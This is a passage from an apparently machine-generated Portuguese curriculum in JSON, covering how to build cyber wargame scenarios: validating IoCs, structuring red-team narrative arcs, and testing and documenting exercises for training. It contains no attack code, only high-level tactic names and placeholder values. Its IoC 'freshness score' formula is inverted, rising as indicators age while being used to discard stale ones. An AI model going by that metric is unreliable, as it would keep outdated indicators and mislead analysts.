                                "Inteligência Artificial (IA: gerar IoCs sintéticos via models).",
                                "Ética e Direito (Cibersegurança: uso responsável de IoCs reais)."
                              ],
                              "realWorldApplication": "Em operações de Red Team/Blue Team, cenários com IoCs integrados treinam detecção em SOCs, simulam IR real (ex: como na breach da Colonial Pipeline), e apoiam threat hunting em ferramentas como Splunk ou ELK Stack."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.3.2.3",
                            "name": "Validar Realismo de IoCs",
                            "description": "Verificar a atualidade e relevância de IoCs usando ferramentas como MISP ou ThreatConnect, evitando falsos positivos em narrativas de treinamento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Coletar IoCs Candidatos",
                                  "subSteps": [
                                    "Liste IoCs potenciais (IPs, hashes, domínios) relevantes ao cenário de ameaça.",
                                    "Pesquise fontes públicas como VirusTotal, AlienVault OTX e relatórios de threat intel.",
                                    "Registre metadados iniciais: origem, data de descoberta e tipo de IoC.",
                                    "Priorize IoCs com alta confiança baseados em scores de reputação.",
                                    "Crie uma tabela inicial com colunas para IoC, fonte e score preliminar."
                                  ],
                                  "verification": "Tabela preenchida com pelo menos 5 IoCs candidatos e metadados completos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "VirusTotal",
                                    "AlienVault OTX",
                                    "Planilha Google Sheets ou Excel"
                                  ],
                                  "tips": "Foquem em IoCs de ameaças TTPs similares ao cenário para maximizar relevância.",
                                  "learningObjective": "Aprender a coletar IoCs de fontes confiáveis e documentá-los sistematicamente.",
                                  "commonMistakes": [
                                    "Ignorar metadados de data",
                                    "Coletar IoCs obsoletos sem verificação inicial",
                                    "Não priorizar por score de confiança"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Verificar Atualidade e Fontes Confiáveis",
                                  "subSteps": [
                                    "Confira a data de última observação em múltiplas fontes (ex: <6 meses para alta relevância).",
                                    "Avalie a credibilidade da fonte (governamental, vendor confiável vs. fóruns anônimos).",
                                    "Compare IoC em bases como MITRE ATT&CK para mapear a táticas associadas.",
                                    "Calcule score de frescor: (dias desde última sighting / 180) * peso da fonte.",
                                    "Elimine IoCs com score abaixo de 70%."
                                  ],
                                  "verification": "Relatório com scores de frescor para cada IoC, eliminando os obsoletos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Relatórios de threat intel (ex: Mandiant M-Trends)",
                                    "Calculadora ou script simples"
                                  ],
                                  "tips": "Use automação como APIs do VirusTotal para agilizar checagens de data.",
                                  "learningObjective": "Desenvolver habilidade em avaliar frescor e credibilidade de IoCs.",
                                  "commonMistakes": [
                                    "Aceitar fontes não verificadas",
                                    "Não considerar contexto temporal de campanhas",
                                    "Sobrecarregar com IoCs antigos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Validar Usando Ferramentas Especializadas como MISP ou ThreatConnect",
                                  "subSteps": [
                                    "Importe IoCs no MISP ou ThreatConnect via API ou interface web.",
                                    "Execute buscas por atributos correlacionados (ex: eventos relacionados, tags de campanha).",
                                    "Analise galaxias e clusters de threat intel para contexto adicional.",
                                    "Verifique IOC score e sightings recentes na plataforma.",
                                    "Exporte relatório de validação com evidências."
                                  ],
                                  "verification": "Relatórios exportados do MISP/ThreatConnect confirmando validade para cada IoC.",
                                  "estimatedTime": "1 hora e 30 minutos",
                                  "materials": [
                                    "Conta em MISP ou ThreatConnect",
                                    "API keys para importação",
                                    "Navegador web"
                                  ],
                                  "tips": "Use tags personalizadas no MISP para cenários específicos de treinamento.",
                                  "learningObjective": "Dominar ferramentas de threat intel sharing para validação precisa.",
                                  "commonMistakes": [
                                    "Não correlacionar com eventos",
                                    "Ignorar falsos positivos reportados nas ferramentas",
                                    "Falhar na autenticação API"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Relevância, Falsos Positivos e Integrar à Narrativa",
                                  "subSteps": [
                                    "Simule IoC em ambiente lab (ex: scan IP em honeypot ou hash em VM).",
                                    "Teste para falsos positivos: verifique se benigno em contextos não-maliciosos.",
                                    "Avalie fit com narrativa: alinha com TTPs do cenário de jogo de guerra?",
                                    "Ajuste ou descarte IoCs não realistas.",
                                    "Documente validação final com evidências para narrativa de treinamento."
                                  ],
                                  "verification": "Documentação final com IoCs validados, testes de FP e integração confirmada.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ambiente lab (VMware/VirtualBox)",
                                    "Ferramentas de scan (Nmap, YARA)",
                                    "Template de narrativa"
                                  ],
                                  "tips": "Registre todos os testes para auditoria posterior em treinamentos.",
                                  "learningObjective": "Garantir realismo evitando falsos positivos em cenários simulados.",
                                  "commonMistakes": [
                                    "Pular testes lab",
                                    "Forçar fit irrelevante na narrativa",
                                    "Não documentar evidências"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de ransomware LockBit, valide o hash de malware 'abc123def' no MISP: confirme sightings recentes em ataques industriais, teste em VM para atividade maliciosa sem falsos positivos em arquivos legítimos, e integre à narrativa como IoC de C2 inicial.",
                              "finalVerifications": [
                                "Todos IoCs têm data de sighting <6 meses em ≥2 fontes.",
                                "Validação confirmada em MISP/ThreatConnect com score >80%.",
                                "Zero falsos positivos em testes lab controlados.",
                                "Relevância comprovada para TTPs do cenário via MITRE mapping.",
                                "Documentação completa com evidências exportadas.",
                                "Integração na narrativa sem inconsistências realistas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na eliminação de IoCs obsoletos (>90% taxa de retenção realista).",
                                "Uso correto de ferramentas (MISP/ThreatConnect) com relatórios completos.",
                                "Detecção e mitigação de falsos positivos em todos testes.",
                                "Qualidade da documentação (clareza, evidências, fit narrativo).",
                                "Eficiência temporal (conclusão dentro de 4-5 horas totais).",
                                "Conexão explícita com contexto de jogo de guerra cibernética."
                              ],
                              "crossCurricularConnections": [
                                "Inteligência de Ameaças ( Threat Hunting e OSINT).",
                                "Análise de Dados (Scoring e correlação estatística de IoCs).",
                                "Simulações e Jogos (Red Team/Blue Team exercises).",
                                "Ética em Cibersegurança (Evitar alarm fatigue por falsos positivos)."
                              ],
                              "realWorldApplication": "Em SOCs e equipes CERT, validação de IoCs previne bloqueios errôneos de tráfego legítimo, otimiza alertas em SIEMs e fortalece defesas em incidentes reais, como campanhas de APT persistentes."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.3.3",
                        "name": "Estruturação da Narrativa",
                        "description": "Construir histórias coesas de ataque, unindo mindset adversário e IoCs em uma sequência lógica de eventos, inspirada em livros como 'Red Team Development and Operations'.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.3.1",
                            "name": "Definir Arco Narrativo",
                            "description": "Estruturar a narrativa em fases (reconhecimento, exploração, ações pós-exploração) com timelines realistas, baseadas em operações documentadas de Red Teams.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as Fases Básicas do Arco Narrativo em Operações Red Team",
                                  "subSteps": [
                                    "Estude as definições padrão de reconhecimento (identificação de alvos e vulnerabilidades iniciais)",
                                    "Analise a fase de exploração (ganhar foothold e mapear rede interna)",
                                    "Revise ações pós-exploração (movimentação lateral, escalada de privilégios e persistência)",
                                    "Identifique transições entre fases baseadas em táticas do MITRE ATT&CK",
                                    "Anote exemplos de duração típica de cada fase em operações reais"
                                  ],
                                  "verification": "Crie um diagrama simples das 3 fases com descrições breves e valide contra framework MITRE ATT&CK",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Framework MITRE ATT&CK (site oficial)",
                                    "Notas ou diagrama digital (ex: Draw.io)"
                                  ],
                                  "tips": "Use cores diferentes para cada fase no diagrama para visualização clara",
                                  "learningObjective": "Dominar as 3 fases principais do arco narrativo em contextos de Red Team",
                                  "commonMistakes": [
                                    "Confundir exploração com pós-exploração",
                                    "Ignorar persistência como parte pós-exploração"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Pesquisar Operações Documentadas de Red Teams",
                                  "subSteps": [
                                    "Selecione 3-5 relatórios públicos de operações reais (ex: SolarWinds, Colonial Pipeline)",
                                    "Extraia timelines de cada operação, focando em marcos de reconhecimento, exploração e pós-exploração",
                                    "Registre durações reais (dias/semanas) e triggers de transição entre fases",
                                    "Compare padrões entre operações para identificar timelines realistas médios",
                                    "Documente evidências de táticas usadas em cada fase"
                                  ],
                                  "verification": "Compile uma tabela comparativa de timelines de pelo menos 3 operações reais",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Relatórios públicos (ex: FireEye, Mandiant)",
                                    "Planilha Google Sheets ou Excel"
                                  ],
                                  "tips": "Priorize fontes confiáveis como blogs de segurança e relatórios governamentais",
                                  "learningObjective": "Coletar dados reais para embasar timelines autênticas",
                                  "commonMistakes": [
                                    "Usar fontes não verificadas",
                                    "Focar apenas em um caso isolado"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Fases com Timelines Realistas",
                                  "subSteps": [
                                    "Defina duração inicial para reconhecimento baseada em pesquisa (ex: 1-4 semanas)",
                                    "Atribua timelines para exploração (ex: 2-6 semanas, dependendo da complexidade)",
                                    "Estabeleça ações pós-exploração com prazos escalonados (ex: 4+ semanas para exfiltração)",
                                    "Inclua buffers para detecção e adaptação em cada fase",
                                    "Crie um Gantt chart simples para visualizar o fluxo temporal"
                                  ],
                                  "verification": "Gere um Gantt chart com timelines totais de 8-12 semanas e justifique cada duração",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramenta de Gantt (ex: Microsoft Project, Trello, ou Lucidchart)",
                                    "Dados da pesquisa do Step 2"
                                  ],
                                  "tips": "Ajuste timelines com base no tamanho do alvo (SMB vs Enterprise)",
                                  "learningObjective": "Criar timelines realistas ancoradas em evidências documentadas",
                                  "commonMistakes": [
                                    "Timelines muito curtas/otimistas",
                                    "Ignorar fases de adaptação pós-detecção"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Refinar e Validar o Arco Narrativo Completo",
                                  "subSteps": [
                                    "Revise o arco para fluidez entre fases e realismo geral",
                                    "Simule o arco em um walkthrough narrativo curto",
                                    "Valide contra critérios de Red Team (ex: stealth, persistence)",
                                    "Colete feedback simulado ou peer review",
                                    "Ajuste timelines e adicione milestones de verificação"
                                  ],
                                  "verification": "Escreva um resumo narrativo de 300 palavras do arco e confirme alinhamento com pelo menos 2 operações reais",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Template de narrativa (Word/Google Docs)",
                                    "Checklists MITRE ATT&CK"
                                  ],
                                  "tips": "Leia em voz alta para detectar quebras no fluxo narrativo",
                                  "learningObjective": "Finalizar um arco narrativo coeso e validado para cenários de ameaça",
                                  "commonMistakes": [
                                    "Faltam transições suaves",
                                    "Excesso de complexidade sem justificativa"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de ataque a uma rede corporativa de manufatura: Reconhecimento (Semanas 1-2: OSINT e scanning de portas abertas com Nmap); Exploração (Semanas 3-4: Phishing para foothold via spear-phishing e exploit de CVE-2023-XXXX); Ações Pós-Exploração (Semanas 5-8: Lateral movement com RDP, escalada para domain admin e exfiltração de dados via C2 server, simulando APT28 timelines reais).",
                              "finalVerifications": [
                                "Pode descrever as 3 fases com exemplos de táticas específicas",
                                "Timelines totais realistas (8-12 semanas) baseadas em pelo menos 3 ops reais",
                                "Gantt chart ou diagrama visual completo e legível",
                                "Narrativa walkthrough fluida sem gaps lógicos",
                                "Validação contra MITRE ATT&CK com mappings explícitos",
                                "Identificação de 2+ pontos de adaptação para detecção"
                              ],
                              "assessmentCriteria": [
                                "Precisão das fases e alinhamento com ops Red Team documentadas (30%)",
                                "Realismo das timelines com evidências citadas (25%)",
                                "Qualidade visual e clareza do Gantt/narrativa (20%)",
                                "Profundidade de sub-táticas e transições (15%)",
                                "Validação e refinamento demonstrados (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Narratologia em Literatura e Cinema (estruturas de 3 atos)",
                                "Planejamento Estratégico em Administração (Gantt e milestones)",
                                "História Militar (campanhas com fases de reconnaissance e exploitation)",
                                "Psicologia Comportamental (timelines baseadas em hábitos humanos)"
                              ],
                              "realWorldApplication": "Em engajamentos Red Team profissionais, define o pacing de exercícios de simulação de APTs, permitindo que Blue Teams pratiquem respostas realistas a ameaças persistentes, como visto em Operation Aurora ou NotPetya recreations."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.1.1"
                            ]
                          },
                          {
                            "id": "10.1.4.3.3.2",
                            "name": "Incorporar Elementos Realistas",
                            "description": "Combinar mindset, IoCs e regras de engajamento em uma história fluida, utilizando exemplos de bibliografia como Simpson et al. para defesa ética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Listar Elementos Chave",
                                  "subSteps": [
                                    "Analisar o mindset típico de atacantes (ex.: oportunista, persistente)",
                                    "Compilar Indicadores de Comprometimento (IoCs) relevantes ao cenário",
                                    "Definir Regras de Engajamento (ROE) claras e éticas",
                                    "Revisar bibliografia como Simpson et al. para exemplos de defesa ética",
                                    "Categorizar elementos em grupos lógicos para integração"
                                  ],
                                  "verification": "Lista completa com pelo menos 5 IoCs, 3 mindsets, 4 ROE e referências bibliográficas anotadas",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Artigos de Simpson et al.",
                                    "Bases de dados de IoCs (MITRE ATT&CK)",
                                    "Templates de ROE para ciberoperações"
                                  ],
                                  "tips": "Use uma tabela ou mindmap para visualizar conexões iniciais entre elementos",
                                  "learningObjective": "Dominar os componentes individuais (mindset, IoCs, ROE) com foco ético",
                                  "commonMistakes": [
                                    "Ignorar contexto ético da bibliografia",
                                    "Listar IoCs genéricos sem relevância ao cenário",
                                    "Confundir ROE com ações irrestritas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar Exemplos da Bibliografia e Casos Reais",
                                  "subSteps": [
                                    "Ler trechos chave de Simpson et al. sobre narrativas éticas em defesa cibernética",
                                    "Identificar padrões de integração em histórias reais de incidentes (ex.: SolarWinds)",
                                    "Mapear como IoCs foram incorporados em relatos fluídos",
                                    "Analisar mindsets em relatórios de threat hunting",
                                    "Extrair lições éticas para evitar narrativas sensacionalistas"
                                  ],
                                  "verification": "Resumo anotado de 3 exemplos com mapeamento de elementos incorporados",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "PDFs de Simpson et al.",
                                    "Relatórios de incidentes cibernéticos (ex.: Verizon DBIR)",
                                    "Vídeos de case studies em cibersegurança"
                                  ],
                                  "tips": "Destaque frases que fluem naturalmente para inspiração",
                                  "learningObjective": "Compreender técnicas comprovadas de realismo narrativo",
                                  "commonMistakes": [
                                    "Focar só em ataques sem defesa ética",
                                    "Não anotar fluxos narrativos",
                                    "Sobrecarregar com detalhes técnicos sem história"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar Draft da Narrativa Integrada",
                                  "subSteps": [
                                    "Esboçar estrutura da história: introdução, desenvolvimento, clímax com IoCs",
                                    "Inserir mindset do atacante de forma orgânica no enredo",
                                    "Tecelagem ROE como decisões éticas em pontos críticos",
                                    "Incorporar IoCs como pistas detectáveis, referenciando Simpson et al.",
                                    "Escrever versão inicial fluída (300-500 palavras)"
                                  ],
                                  "verification": "Draft escrito com todos elementos explicitamente integrados e referenciados",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Editor de texto (Google Docs)",
                                    "Templates de narrativas de threat scenarios",
                                    "Checklist de elementos chave"
                                  ],
                                  "tips": "Escreva como um conto, não um relatório técnico",
                                  "learningObjective": "Combinar elementos em uma narrativa coesa e acionável",
                                  "commonMistakes": [
                                    "Narrativa robótica sem emoção",
                                    "Expor elementos de forma didática demais",
                                    "Violar ROE na história por falta de ética"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Refinar, Testar e Validar Realismo",
                                  "subSteps": [
                                    "Revisar fluidez: ler em voz alta para naturalidade",
                                    "Simular walkthrough com colega para feedback em IoCs e ROE",
                                    "Ajustar para realismo ético baseado em Simpson et al.",
                                    "Verificar conexões lógicas entre mindset e ações",
                                    "Finalizar versão polida com anotações de melhorias"
                                  ],
                                  "verification": "Narrativa revisada aprovada por autoavaliação ou peer review",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramenta de revisão (Grammarly para fluidez)",
                                    "Grupo de pares em cibersegurança",
                                    "Rubrica de avaliação ética"
                                  ],
                                  "tips": "Peça feedback focado em 'parece real?'",
                                  "learningObjective": "Produzir narrativas realistas, éticas e envolventes",
                                  "commonMistakes": [
                                    "Não iterar o suficiente",
                                    "Ignorar feedback sobre exageros",
                                    "Perder elementos chave na revisão"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de wargame, o analista Alex, com mindset oportunista como em Simpson et al., nota IoCs como tráfego C2 anômalo (porta 443 spike). Seguindo ROE éticas, ele pausa escalada para notificar o time, tecendo uma narrativa fluída: 'Enquanto monitorava o dashboard, Alex sentiu o instinto oportunista alertado pelo pico sutil – latência de 200ms em conexões outbound. ROE #3 o fez hesitar: reportar antes de mitigar, evitando contaminação ética.'",
                              "finalVerifications": [
                                "Narrativa flui sem interrupções técnicas, como uma história real",
                                "Todos IoCs, mindsets e ROE estão organicamente integrados",
                                "Referências éticas (ex.: Simpson et al.) justificam escolhas",
                                "Leitura revela realismo detectável por não-especialistas",
                                "Simulação confirma acionabilidade sem ambiguidades",
                                "Versão final <600 palavras, concisa e impactante"
                              ],
                              "assessmentCriteria": [
                                "Grau de fluidez narrativa (escala 1-10)",
                                "Precisão e relevância dos IoCs incorporados",
                                "Adesão ética às ROE com referências bibliográficas",
                                "Realismo do mindset do atacante",
                                "Capacidade de engajar leitor como cenário real",
                                "Ausência de erros comuns (ex.: exposição didática)"
                              ],
                              "crossCurricularConnections": [
                                "Storytelling e Redação Criativa (Letras/Comunicação)",
                                "Psicologia Comportamental (análise de mindsets)",
                                "Ética Aplicada (Filosofia e Direito)",
                                "Análise de Dados (interpretação de IoCs)"
                              ],
                              "realWorldApplication": "Criar cenários realistas para treinamentos de red team/blue team em empresas, jogos de guerra cibernéticos governamentais ou simulações de incident response, melhorando detecção e resposta ética a ameaças reais."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.1.3",
                              "10.1.4.3.2.2"
                            ]
                          },
                          {
                            "id": "10.1.4.3.3.3",
                            "name": "Testar e Refinar Narrativa",
                            "description": "Realizar revisões com pares ou simulações para garantir imersão e precisão técnica, ajustando com base em feedback de consciência situacional.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar a Narrativa para Testes Iniciais",
                                  "subSteps": [
                                    "Documente a narrativa completa em um formato compartilhável, incluindo elementos chave como enredo, personagens, timeline e elementos técnicos de ameaça cibernética.",
                                    "Defina critérios de avaliação preliminares focados em imersão (realismo emocional) e precisão técnica (detalhes de exploits, vetores de ataque).",
                                    "Selecione 3-5 pares revisores com expertise em cibersegurança ou operações de guerra cibernética.",
                                    "Crie um questionário padronizado para feedback, cobrindo consciência situacional, plausibilidade e engajamento.",
                                    "Prepare uma versão resumida da narrativa para leitura rápida."
                                  ],
                                  "verification": "Confirme que todos os materiais estão prontos e compartilhados com os revisores via e-mail ou plataforma colaborativa.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Documento da narrativa (Google Docs ou PDF), questionário de feedback (Google Forms), lista de revisores.",
                                  "tips": "Mantenha a narrativa concisa inicialmente para facilitar feedback rápido.",
                                  "learningObjective": "Entender como estruturar materiais de teste para maximizar feedback acionável.",
                                  "commonMistakes": "Sobrecarregar revisores com texto excessivo; ignorar diversidade de expertise nos pares."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Conduzir Revisões com Pares",
                                  "subSteps": [
                                    "Compartilhe a narrativa e questionário com os pares selecionados.",
                                    "Agende sessões de 30-45 minutos para discussão síncrona via Zoom ou Teams.",
                                    "Colete feedback escrito e verbal, focando em gaps de imersão (ex: motivações de atacantes irreais) e precisão técnica (ex: exploits desatualizados).",
                                    "Registre respostas em uma planilha centralizada para análise.",
                                    "Agradeça aos pares e pergunte por sugestões adicionais."
                                  ],
                                  "verification": "Obtenha pelo menos 80% de respostas do questionário e resumos de todas as sessões.",
                                  "estimatedTime": "4-6 horas (incluindo sessões)",
                                  "materials": "Plataforma de videoconferência (Zoom/Teams), planilha de feedback (Google Sheets), questionário.",
                                  "tips": "Grave sessões com permissão para revisar nuances não capturadas em notas.",
                                  "learningObjective": "Desenvolver habilidades de elicitação de feedback qualitativo de pares.",
                                  "commonMistakes": "Não gravar sessões ou ignorar feedback subjetivo sobre imersão."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Simulações de Teste",
                                  "subSteps": [
                                    "Converta a narrativa em uma simulação low-fidelity, como role-playing ou ferramenta de gamificação cibernética.",
                                    "Execute 2-3 rodadas de simulação com um grupo pequeno (4-6 participantes simulando defensores/atacantes).",
                                    "Monitore reações em tempo real para consciência situacional (confusão, engajamento).",
                                    "Colete métricas quantitativas como tempo de reação a eventos e taxa de detecção de ameaças.",
                                    "Documente anomalias técnicas ou narrativas durante a simulação."
                                  ],
                                  "verification": "Complete todas as rodadas de simulação com relatórios de métricas e observações registradas.",
                                  "estimatedTime": "6-8 horas",
                                  "materials": "Ferramentas de simulação (Cyber Range software ou tabletop exercises), cronômetro, formulários de observação.",
                                  "tips": "Use timers para eventos críticos para simular pressão real de operações cibernéticas.",
                                  "learningObjective": "Aplicar narrativas em simulações para validar imersão e precisão.",
                                  "commonMistakes": "Simulações muito complexas que mascaram falhas narrativas; ignorar feedback não verbal."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Feedback e Refinar Narrativa",
                                  "subSteps": [
                                    "Compile todo feedback em temas (imersão, precisão, consciência situacional) usando análise qualitativa.",
                                    "Priorize ajustes baseados em recorrência (ex: 70% dos pares notaram gap técnico).",
                                    "Revise a narrativa iterativamente, incorporando mudanças e testando internamente.",
                                    "Valide refinamentos com um peer review rápido.",
                                    "Versão finalize a narrativa documentada com changelog de refinamentos."
                                  ],
                                  "verification": "Narrativa atualizada reflete pelo menos 90% dos feedbacks principais, com changelog completo.",
                                  "estimatedTime": "3-5 horas",
                                  "materials": "Planilha de análise de feedback, versão editável da narrativa, changelog template.",
                                  "tips": "Use cores na planilha para categorizar feedback (vermelho=crítico, verde=opcional).",
                                  "learningObjective": "Transformar feedback bruto em refinamentos acionáveis.",
                                  "commonMistakes": "Ignorar feedback minoritário que revela issues sistêmicos; over-editing sem validação."
                                }
                              ],
                              "practicalExample": "Em um cenário de jogo de guerra cibernética simulando um ataque APT chinês a infraestrutura crítica brasileira, realize revisões com pares de analistas SOC que identificam falta de realismo na cadeia de comando do atacante. Simule com uma equipe de 5, ajustando a narrativa para incluir vetores de phishing mais plausíveis baseados em TTPs reais do MITRE ATT&CK, resultando em 25% mais detecções durante a segunda rodada.",
                              "finalVerifications": [
                                "Narrativa mantém imersão alta (nota média >4/5 em engajamento).",
                                "Precisão técnica validada contra frameworks como MITRE ATT&CK (zero discrepâncias).",
                                "Consciência situacional aprimorada (participantes reportam clareza em 90% dos eventos).",
                                "Feedback incorporado em changelog rastreável.",
                                "Simulação final atinge métricas de sucesso (ex: taxa de resposta <5min para ameaças críticas).",
                                "Narrativa é concisa e escalável para treinamentos maiores."
                              ],
                              "assessmentCriteria": [
                                "Profundidade de análise de feedback (cobertura de todos temas).",
                                "Qualidade das iterações (mudanças lógicas e impactantes).",
                                "Eficácia na imersão (medida por scores subjetivos).",
                                "Precisão técnica pós-refinamento (alinhamento com standards cibernéticos).",
                                "Eficiência temporal (dentro de estimativas).",
                                "Documentação completa e acionável."
                              ],
                              "crossCurricularConnections": [
                                "Comunicação: Técnicas de feedback construtivo e storytelling.",
                                "Psicologia: Modelos de consciência situacional (Endsley) para imersão.",
                                "Gestão de Projetos: Iteração ágil em refinamentos.",
                                "Análise de Dados: Processamento qualitativo/quantitativo de feedback."
                              ],
                              "realWorldApplication": "Em equipes de Red Team/Blue Team de empresas como bancos ou agências governamentais, refinar narrativas de exercícios de guerra cibernética garante treinamentos mais eficazes, reduzindo tempos de detecção de incidentes reais em até 30% conforme métricas de maturidade NIST."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.3.2"
                            ]
                          },
                          {
                            "id": "10.1.4.3.3.4",
                            "name": "Documentar para Jogos de Guerra",
                            "description": "Gerar relatórios narrativos prontos para montagem de ambientes de jogos cibernéticos, incluindo referências bibliográficas como Vest e Tuberville.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar e Coletar Referências Bibliográficas",
                                  "subSteps": [
                                    "Identifique fontes chave como 'Vest' e 'Tuberville' relacionadas a jogos de guerra cibernéticos.",
                                    "Busque em bases de dados acadêmicas, relatórios militares e publicações de cibersegurança por referências adicionais.",
                                    "Anote citações completas no formato APA ou IEEE, incluindo DOI ou URLs.",
                                    "Classifique referências por relevância: primárias (ex.: estudos de caso reais) e secundárias (análises teóricas).",
                                    "Crie um índice preliminar de referências com resumos de 1-2 frases cada."
                                  ],
                                  "verification": "Verifique se há pelo menos 5-10 referências anotadas com resumos e classificações.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Acesso a Google Scholar, JSTOR ou bibliotecas militares",
                                    "Ferramentas de gerenciamento como Zotero ou Mendeley",
                                    "Notas em documento Google Docs"
                                  ],
                                  "tips": "Priorize fontes recentes (últimos 5 anos) e de autores credenciados em cibersegurança.",
                                  "learningObjective": "Dominar a coleta sistemática de referências para embasar narrativas realistas.",
                                  "commonMistakes": [
                                    "Ignorar verificação de credibilidade das fontes",
                                    "Não incluir metadados completos",
                                    "Sobrecarregar com referências irrelevantes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estruturar o Formato do Relatório Narrativo",
                                  "subSteps": [
                                    "Defina seções padrão: Introdução, Cenário de Ameaça, Sequência de Eventos, Impactos e Referências.",
                                    "Crie um outline com placeholders para integração de referências (ex.: [Vest, 2020] para táticas de phishing).",
                                    "Inclua elementos visuais como timeline de ataques e diagramas de rede afetada.",
                                    "Adapte o template para compatibilidade com ferramentas de simulação como Cyber Range ou MITRE ATT&CK.",
                                    "Valide a estrutura com checklist de completude (ex.: narrativa fluida e acionável)."
                                  ],
                                  "verification": "Outline completo com todas as seções e placeholders preenchidos.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Templates de relatórios em Word ou LaTeX",
                                    "Diagramadores como Draw.io ou Lucidchart",
                                    "Framework MITRE ATT&CK"
                                  ],
                                  "tips": "Use headings hierárquicos para facilitar a montagem em ambientes de jogos cibernéticos.",
                                  "learningObjective": "Aprender a criar estruturas modulares para relatórios prontos para simulação.",
                                  "commonMistakes": [
                                    "Estruturas muito rígidas sem flexibilidade",
                                    "Omitir visuais que auxiliam na compreensão",
                                    "Ignorar compatibilidade com ferramentas de simulação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Escrever a Narrativa Detalhada com Integração de Referências",
                                  "subSteps": [
                                    "Redija a introdução contextualizando o cenário com dados reais de 'Tuberville'.",
                                    "Descreva a sequência de ataques passo a passo, citando táticas de 'Vest' (ex.: spear-phishing inicial).",
                                    "Inclua diálogos simulados, métricas de impacto (ex.: downtime de 48h) e respostas defensivas.",
                                    "Integre referências inline e expanda em notas de rodapé para detalhes técnicos.",
                                    "Garanta tom narrativo imersivo, como um 'script de filme' para facilitadores de jogos."
                                  ],
                                  "verification": "Narrativa completa com pelo menos 1500 palavras e todas referências integradas.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Processador de texto com suporte a citações (ex.: Google Docs com add-ons)",
                                    "Exemplos de narrativas de jogos de guerra passados"
                                  ],
                                  "tips": "Escreva em terceira pessoa para neutralidade e use verbos ativos para dinamismo.",
                                  "learningObjective": "Desenvolver habilidade em narrativa técnica persuasiva ancorada em evidências.",
                                  "commonMistakes": [
                                    "Citações soltas sem integração fluida",
                                    "Narrativa muito técnica sem imersão",
                                    "Excesso de jargão sem definições"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Revisar, Validar e Finalizar o Documento",
                                  "subSteps": [
                                    "Revise por precisão factual cruzando com referências originais.",
                                    "Teste legibilidade com leitura em voz alta e feedback de pares.",
                                    "Verifique formatação: índices, hyperlinks e exportação para PDF/HTML.",
                                    "Adicione apêndices com glossário e mapas de ameaças.",
                                    "Simule montagem em ambiente de jogo cibernético para validação prática."
                                  ],
                                  "verification": "Documento final aprovado por auto-revisão e teste de simulação sem erros.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas de revisão como Grammarly",
                                    "Ambiente de teste Cyber Range virtual"
                                  ],
                                  "tips": "Deixe o documento 'plug-and-play' para trainers sem edição adicional.",
                                  "learningObjective": "Garantir qualidade profissional em documentação para operações cibernéticas.",
                                  "commonMistakes": [
                                    "Pular revisão de referências",
                                    "Formatação inconsistente",
                                    "Não testar usabilidade prática"
                                  ]
                                }
                              ],
